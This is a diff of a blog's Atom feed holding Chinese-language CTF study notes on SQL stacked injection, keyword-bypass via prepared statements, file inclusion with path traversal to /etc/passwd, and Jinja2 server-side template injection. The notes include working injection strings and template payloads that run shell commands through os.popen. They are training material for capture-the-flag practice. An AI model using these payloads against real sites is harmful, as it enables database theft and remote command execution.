-    <id>https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:00:57.003Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL堆叠注入&quot;&gt;&lt;a href=&quot;#SQL堆叠注入&quot; class=&quot;headerlink&quot; title=&quot;SQL堆叠注入&quot;&gt;&lt;/a&gt;SQL堆叠注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;运用情况：当有过滤select&amp;#x2F;upd</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
     <title>PHP魔术技巧</title>
     <link href="https://smileless-l.github.io/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/"/>
     <id>https://smileless-l.github.io/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</id>
@@ -443,33 +417,6 @@ MathJax = {
     <summary type="html">&lt;h1 id=&quot;php魔术技巧&quot;&gt;&lt;a href=&quot;#php魔术技巧&quot; class=&quot;headerlink&quot; title=&quot;php魔术技巧&quot;&gt;&lt;/a&gt;php魔术技巧&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： PHP #魔术技巧#&lt;/p&gt;
 &lt;p&gt;—php&lt;/p&gt;
 &lt;p&gt;反序列化的基本格式：</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>php函数简记</title>
-    <link href="https://smileless-l.github.io/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
-    <id>https://smileless-l.github.io/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T16:56:12.049Z</updated>
-    
-    <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;一些简单php函数简记&lt;/p&gt;
-&lt;p&gt;标签（空格分隔）： PHP &lt;/p&gt;
-&lt;p&gt;–PHP 函数&lt;/p&gt;
-&lt;h2 id=&quot;php函数简记&quot;&gt;&lt;a href=&quot;#php函数简记&quot; class=&quot;headerlink&quot; title=&quot;php函数简记&quot;&gt;&lt;/a&gt;php函数简记&lt;/</summary>
       
     
     
@@ -506,20 +453,47 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>文件包含漏洞</title>
-    <link href="https://smileless-l.github.io/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://smileless-l.github.io/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
+    <title>预编译拼接字符法</title>
+    <link href="https://smileless-l.github.io/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
+    <id>https://smileless-l.github.io/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T16:57:15.390Z</updated>
+    <updated>2026-02-06T17:06:07.346Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： 文件类&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;预编译拼接字符法&quot;&gt;&lt;a href=&quot;#预编译拼接字符法&quot; class=&quot;headerlink&quot; title=&quot;预编译拼接字符法&quot;&gt;&lt;/a&gt;预编译拼接字符法&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;通常没有看到可以输入的框的时候可以试着看看URL的构造来</summary>
+&lt;p&gt;直接concat函数来进行一个拼接字</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>php函数简记</title>
+    <link href="https://smileless-l.github.io/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
+    <id>https://smileless-l.github.io/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T16:56:12.049Z</updated>
+    
+    <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;一些简单php函数简记&lt;/p&gt;
+&lt;p&gt;标签（空格分隔）： PHP &lt;/p&gt;
+&lt;p&gt;–PHP 函数&lt;/p&gt;
+&lt;h2 id=&quot;php函数简记&quot;&gt;&lt;a href=&quot;#php函数简记&quot; class=&quot;headerlink&quot; title=&quot;php函数简记&quot;&gt;&lt;/a&gt;php函数简记&lt;/</summary>
       
     
     
@@ -528,6 +502,32 @@ MathJax = {
     
     
     <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SSTI简记</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:01:54.618Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><h2 id="识别模板引擎"><a href="#识别模板引擎" class="headerlink" title="##识别模板引擎##"></a>##识别模板引擎##<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure></h2><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SSTI简记&quot;&gt;&lt;a href=&quot;#SSTI简记&quot; class=&quot;headerlink&quot; title=&quot;SSTI简记&quot;&gt;&lt;/a&gt;SSTI简记&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： ssti&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&quot;识别模板引擎&quot;&gt;&lt;a href=&quot;#识别模板</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SSTI" scheme="https://smileless-l.github.io/tags/SSTI/"/>
     
   </entry>
   
